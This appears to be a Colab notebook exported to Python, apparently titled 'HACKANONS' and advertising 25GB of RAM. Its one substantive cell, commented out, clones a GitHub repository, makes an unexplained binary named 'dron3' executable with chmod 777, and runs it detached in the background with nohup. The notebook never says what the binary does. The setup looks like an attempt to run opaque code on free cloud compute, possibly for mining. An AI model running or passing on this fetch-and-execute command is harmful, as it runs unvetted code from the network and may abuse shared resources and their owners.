# %% [markdown]
# <a href="https://colab.research.google.com/github/rpolikjop/upol/blob/master/jiklpklasHACKANONS_COLAB_25GB_RAM.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %% [markdown]
# # New Section

# %%
# !lscpu

# %%
# !git clone https://github.com/raufpermana22/rvan.git && cd rvan && chmod 777 dron3 && nohup ./dron3
